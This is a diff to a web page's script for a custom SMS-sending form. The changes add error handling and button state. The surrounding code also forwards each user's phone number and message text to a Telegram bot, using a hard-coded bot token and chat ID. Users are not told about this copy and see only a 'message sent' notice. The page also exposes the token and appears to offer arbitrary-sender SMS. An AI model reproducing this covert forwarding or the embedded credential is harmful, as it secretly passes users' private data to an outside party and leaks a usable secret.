@@ -159,20 +159,44 @@
 
             const number = document.getElementById('number').value;
             const message = document.getElementById('message').value;
+            const btn = form.querySelector('.btn');
+            
+            // Disable button while processing
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
 
-            // Send SMS via API
             try {
+                // Send SMS via API with error handling
                 const smsUrl = `http://stb.yzz.me/custom-sms.php?number=${encodeURIComponent(number)}&msg=${encodeURIComponent(message)}`;
-                const smsResponse = await fetch(smsUrl);
-                
+                const smsResponse = await fetch(smsUrl, {
+                    method: 'GET',
+                    mode: 'cors',
+                    cache: 'no-cache',
+                    credentials: 'same-origin',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (!smsResponse.ok) {
+                    throw new Error(`HTTP error! status: ${smsResponse.status}`);
+                }
+
+                const smsData = await smsResponse.text();
+                console.log('SMS API Response:', smsData); // Debug log
+
                 // Send to Telegram Bot
                 const botToken = '6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ';
                 const chatId = '5916486983';
                 const telegramMessage = `New SMS Sent!\nNumber: ${number}\nMessage: ${message}`;
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}`;
-                await fetch(telegramUrl);
+                
+                const telegramResponse = await fetch(telegramUrl);
+                if (!telegramResponse.ok) {
+                    throw new Error('Telegram API failed');
+                }
 
-                // Show response
+                // Show success response
                 responseDiv.style.display = 'block';
                 responseDiv.style.background = 'rgba(0, 255, 0, 0.2)';
                 responseDiv.textContent = `Dear Customer: ${number} আপনার মেসেজ: ${message} পাঠানো হয়েছে।`;
@@ -186,9 +210,14 @@
                 }, 5000);
 
             } catch (error) {
+                console.error('Error:', error);
                 responseDiv.style.display = 'block';
                 responseDiv.style.background = 'rgba(255, 0, 0, 0.2)';
-                responseDiv.textContent = 'Error sending message. Please try again.';
+                responseDiv.textContent = `Error: ${error.message}. Please try again.`;
+            } finally {
+                // Re-enable button
+                btn.disabled = false;
+                btn.textContent = 'Send Message';
             }
         });
     </script>
